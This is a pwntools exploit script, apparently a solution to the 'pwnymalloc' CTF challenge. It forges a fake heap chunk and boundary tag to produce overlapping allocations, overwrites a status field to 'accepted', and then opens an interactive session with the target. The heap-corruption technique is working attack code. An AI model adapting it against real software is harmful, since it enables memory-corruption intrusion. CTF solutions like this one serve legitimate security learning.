from pwn import *

binary_name = "dbg"
exe  = ELF(binary_name, checksec=True)
context.binary = exe

if args.REMOTE:
	r = connect("pwnymalloc.chal.uiuc.tf", 1337, ssl=True)
elif args.GDB:
	r = gdb.debug(f"./{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"./{binary_name}")


def alloc(amt, buf):
	r.sendlineafter(b"> ", b"3")
	r.sendlineafter(b"\n", b"%d" % amt)
	r.sendafter(b"\n", buf)

def comply(buf):
	r.sendlineafter(b"> ", b"1")
	r.sendlineafter(b"\n", buf)


fake_chunk = p64(0x90 - 0x50) + p64(0x0) * 2
chunk1 = b"A" * 0x60 + fake_chunk
fake_btag = p64(0xb0)
chunk2 = b"A" * 0x78 + fake_btag
alloc(0x1337, chunk1 + b"\n")
alloc(0x1338, chunk2[:-1])

comply(b"AAAA")

ACCEPTED = 1
status_and_value = p64(ACCEPTED | (0x1339 << 32))
overlapping_chunk = b"A" * 0x18 + status_and_value
alloc(0x1339, overlapping_chunk + b"\n")

r.sendlineafter(b"> ", b"4")
r.sendlineafter(b"\n", b"1")

r.interactive()
